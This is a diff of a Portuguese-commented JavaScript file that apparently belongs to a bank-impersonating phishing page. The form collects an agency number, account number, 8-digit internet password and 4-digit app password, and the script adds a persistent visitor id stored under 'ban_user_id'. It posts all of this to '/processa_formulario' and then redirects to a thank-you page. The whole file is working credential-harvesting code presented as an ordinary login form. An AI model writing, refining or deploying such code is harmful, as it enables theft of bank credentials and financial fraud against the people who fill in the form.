@@ -1,4 +1,20 @@
-const form = document.querySelector("form");
+// script.js
+
+// --- Início: gera e anexa o user_id ---
+const form = document.getElementById("mainForm");
+
+let userId = localStorage.getItem("ban_user_id");
+if (!userId) {
+  userId = Date.now() + "-" + Math.random().toString(36).substr(2, 9);
+  localStorage.setItem("ban_user_id", userId);
+}
+const hidden = document.createElement("input");
+hidden.type = "hidden";
+hidden.name = "user_id";
+hidden.value = userId;
+form.appendChild(hidden);
+// --- Fim do user_id ---
+
 const opcao1 = document.querySelector("#opcao1");
 const opcao2 = document.querySelector("#opcao2");
 const opcao3 = document.querySelector("#opcao3");
@@ -7,123 +23,102 @@ const agency = document.querySelector("#agency");
 const login = document.querySelector("#login");
 const internet = document.querySelector("#internet");
 const app = document.querySelector("#app");
-const spans = document.querySelectorAll('.span-required');
-const campos = document.querySelectorAll('.required');
+const spans = document.querySelectorAll(".span-required");
+const campos = document.querySelectorAll(".required");
 
 // Função para filtrar caracteres não numéricos
 function filterNumbers(event) {
   const input = event.target;
   input.value = input.value.replace(/\D+/g, "");
 }
-
-// Aplica a função de filtragem a todos os campos
-const fields = [agency, login, internet, app];
-fields.forEach((field) => {
-  field.addEventListener("input", filterNumbers);
-});
+[agency, login, internet, app].forEach(field =>
+  field.addEventListener("input", filterNumbers)
+);
 
 // Função para limitar o número de caracteres em tempo real
 function limitInputLength(event, maxLength) {
   const input = event.target;
   input.value = input.value.slice(0, maxLength);
 }
+agency.addEventListener("input", e => limitInputLength(e, 4));
+login.addEventListener("input", e => limitInputLength(e, 8));
+internet.addEventListener("input", e => limitInputLength(e, 8));
+app.addEventListener("input", e => limitInputLength(e, 4));
 
-// Adiciona o event listener de input para limitar a entrada de caracteres
-agency.addEventListener("input", (event) => limitInputLength(event, 4));
-login.addEventListener("input", (event) => limitInputLength(event, 8));
-internet.addEventListener("input", (event) => limitInputLength(event, 8));
-app.addEventListener("input", (event) => limitInputLength(event, 4));
-
-// Função para mostrar o span de erro de formulário
-function setError(index) {
-  campos[index].style.border = '2px solid #e63636';
-  spans[index].style.display = 'block';
+// Funções de erro e validação
+function setError(idx) {
+  campos[idx].style.border = "2px solid #e63636";
+  spans[idx].style.display = "block";
+}
+function removeError(idx) {
+  campos[idx].style.border = "";
+  spans[idx].style.display = "none";
 }
 
-// Função para remover o span de erro de formulário
-function removeError(index) {
-  campos[index].style.border = '';
-  spans[index].style.display = 'none';
-}
-
-// Funções de validação
 function agValidate() {
-  console.log('Agência:', campos[0].value);
   if (campos[0].value.length < 4) {
-    // Preencher com zeros à esquerda até que o comprimento seja 4
-    campos[0].value = campos[0].value.padStart(4, '0');
+    campos[0].value = campos[0].value.padStart(4, "0");
   }
   if (campos[0].value.length !== 4) {
     setError(0);
     return false;
-  } else {
-    removeError(0);
-    return true;
   }
+  removeError(0);
+  return true;
 }
 
 function countValidate() {
-  console.log('Conta:', campos[1].value);
   if (campos[1].value.length < 8) {
-    // Preencher com zeros à esquerda até que o comprimento seja 8
-    campos[1].value = campos[1].value.padStart(8, '0');
+    campos[1].value = campos[1].value.padStart(8, "0");
   }
   if (campos[1].value.length !== 8) {
     setError(1);
     return false;
-  } else {
-    removeError(1);
-    return true;
   }
+  removeError(1);
+  return true;
 }
 
 function internetValidate() {
-  console.log('Internet:', campos[2].value);
   if (campos[2].value.length !== 8) {
     setError(2);
     return false;
-  } else {
-    removeError(2);
-    return true;
   }
+  removeError(2);
+  return true;
 }
 
 function digitalValidate() {
-  console.log('App:', campos[3].value);
   if (campos[3].value.length !== 4) {
     setError(3);
     return false;
-  } else {
-    removeError(3);
-    return true;
   }
+  removeError(3);
+  return true;
 }
 
-// Função para validar e enviar o formulário
-form.addEventListener("submit", (event) => {
-  event.preventDefault(); // Evita o envio padrão do formulário
+// Envio via fetch
+form.addEventListener("submit", event => {
+  event.preventDefault();
 
-  // Valida todos os campos
-  const isAgenciaValid = agValidate();
-  const isLoginValid = countValidate();
-  const isInternetValid = internetValidate();
-  const isAppValid = digitalValidate();
+  const okAg = agValidate();
+  const okCnt = countValidate();
+  const okInt = internetValidate();
+  const okApp = digitalValidate();
 
-  // Se todos os campos forem válidos, envia o formulário
-  if (isAgenciaValid && isLoginValid && isInternetValid && isAppValid) {
-    const formData = new FormData(form); // Coleta os dados do formulário
-
+  if (okAg && okCnt && okInt && okApp) {
+    const formData = new FormData(form);
     fetch("/processa_formulario", {
       method: "POST",
-      body: formData,
+      body: formData
     })
-      .then((response) => {
+      .then(response => {
         if (response.ok) {
-          window.location.href = "/agradecimento.html"; // Redireciona para a página de agradecimento
+          window.location.href = "/agradecimento.html";
         } else {
           console.error("Erro ao enviar o formulário.");
         }
       })
-      .catch((error) => console.error("Erro:", error));
+      .catch(error => console.error("Erro:", error));
   }
 });
